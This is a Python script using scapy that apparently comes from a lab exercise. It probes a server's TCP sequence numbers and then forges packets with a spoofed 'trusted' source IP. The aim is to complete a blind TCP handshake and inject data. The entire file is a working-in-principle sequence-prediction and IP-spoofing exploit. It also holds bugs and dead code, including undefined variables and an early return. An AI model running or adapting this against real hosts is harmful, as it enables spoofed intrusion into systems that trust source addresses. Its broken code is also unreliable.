from scapy.all import *

def sniff_seqns(serverip, serverport, n):
  ip = IP(dst=serverip)
  seqs = []
  for i in range(0,n):
    sport = random.randint(1024, 65535)
    SYN = TCP(sport=sport, dport=serverport, flags='S', seq=1000)
    SYNACK = sr1(ip/SYN, verbose=0)
    seqs.append(SYNACK.seq)
  d = {}
  for s in seqs:
    print(s)
    if s in d:
      d[s] += 1
    else:
      d[s] = 1
  for key in d:
    print(str(key) + ": " + str(d[key]))
    
def exploit(localip, serverip, trustedip, n):
  ip_l = IP(dst=serverip)
  ip_t = IP(src=trustedip, dst=serverip)
  for i in range(0,n):
    sport = random.randint(1024,65535)
    seq1 = random.randint(0, 50000)
    seq2 = random.randint(0, 75000)
    SYN_t = TCP(sport=sport, dport=trustedport, flags='S', seq=seq1)
    SYN_l = TCP(sport=sport+1, dport=trustedport, flags='S', seq=seq1)
    send(ip_t/SYN_t, verbose=0)
    SYNACK=sr1(ip_l/SYN_l, verbose=0)
    ACK = TCP(sport=sport, dport=trustedport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq+1)
    send(ip_t/ACK, verbose=0)
    payload = ip_t / TCP(sport=sport, dport=trustedport, seq=SYNACK.ack, ack=SYNACK.seq+1) / Raw(localip)
    send(payload, verbose=0)

def main(args):
  localip = args[0]
  serverip = args[1]
  trustedip = args[2]
  trustedport = 31337
  
  sniff_seqns(serverip, trustedport, 1000)
  return
  
  
  ip_l = IP(dst=serverip)
  ip_t = IP(src=trustedip, dst=serverip)
  seqs = []
  for i in range(0,1000):
    sport = random.randint(1024,65535)
    seq1 = random.randint(0, 50000)
    seq2 = random.randint(0, 75000)
    SYN_t = TCP(sport=sport, dport=trustedport, flags='S', seq=seq1)
    SYN_l = TCP(sport=sport+1, dport=trustedport, flags='S', seq=seq1)
    send(ip_t/SYN_t, verbose=0)
    SYNACK=sr1(ip_l/SYN_l, verbose=0)
    ACK = TCP(sport=sport, dport=trustedport, flags='A', seq=SYNACK.ack, ack=SYNACK.seq+1)
    send(ip_t/ACK, verbose=0)
    payload = ip_t / TCP(sport=sport, dport=trustedport, seq=SYNACK.ack, ack=SYNACK.seq+1) / Raw(localip)
    send(payload, verbose=0)
    #seqs.append(SYNACK.seq)
  #for s in seqs:
  #  print(s)
  return
  ip = IP(src=trustedip, dst=serverip)
  
  SYN=TCP(sport=sport,dport=int(trustedport),flags='S',seq=0)
  ipsyn = ip/SYN
  (ipsyn).show()
  SYNACK=sr1(ipsyn)
  SYNACK.show()
  ACK=TCP(sport=sport, dport=int(trustedport), flags='A', seq=1, ack=1)
  ipack = ip/ACK
  ipack.show()
  send(ipack)
  
  
  spoof = ip / TCP(sport=sport, dport=trustedport, seq=1, ack=1) / Raw(localip)
  spoof.show()
  fs = "udp and host " + localip + " and port " + str(trustedport)
  send(spoof)
  pkts = sniff(filter=fs, count=1)
  pkts.show()
  
  
if __name__ == "__main__":
  main(sys.argv[1:])
